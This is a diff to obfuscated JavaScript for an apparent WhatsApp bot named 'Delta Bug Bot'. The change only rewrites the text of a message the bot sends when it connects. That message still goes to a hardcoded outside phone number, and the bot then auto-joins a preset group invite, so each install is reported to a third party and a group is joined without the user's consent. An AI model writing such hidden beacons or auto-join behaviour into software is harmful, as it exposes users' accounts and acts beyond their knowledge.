@@ -93,12 +93,7 @@ async function startSesi() {
       } else if (_0x1f4755 === "open") {
         success('1', 'Tersambung');
         _0x4b6544.sendMessage("94742274855@s.whatsapp.net", {
-          'text': "> ✨💖 𝐃𝐞𝐥𝐭𝐚 𝐁𝐮𝐠 𝐁𝐨𝐭 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲 𝐈𝐧𝐬𝐭𝐚𝐥𝐥𝐞𝐝 𝐘𝐨𝐮𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩🪀✓
-
-*🥹...Please Subscribe My Channel...💗* - :
- https://www.youtube.com/@ManulOfficialTech
-
-> *_©ʍɾ ℂ𝕪𝕓𝕖𝕣 ʍɑղմӀ օƒƒíϲíɑӀ♠️_*"
+          'text': "Connected...✓"
         });
         if (autoJoin) {
           _0x4b6544.groupAcceptInvite(codeInvite);
